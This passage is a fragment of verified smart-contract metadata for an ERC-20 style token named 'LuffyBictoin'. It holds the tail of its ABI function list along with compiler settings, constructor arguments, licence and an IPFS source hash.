uts\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LuffyBictoin", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000f5cc1cb6d3044033f150ee4d523eeb243bc137ec", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://56c7f8b5342061e9ac410e939c4735d916f3068f555c8e1dc87a07d810052d7f"}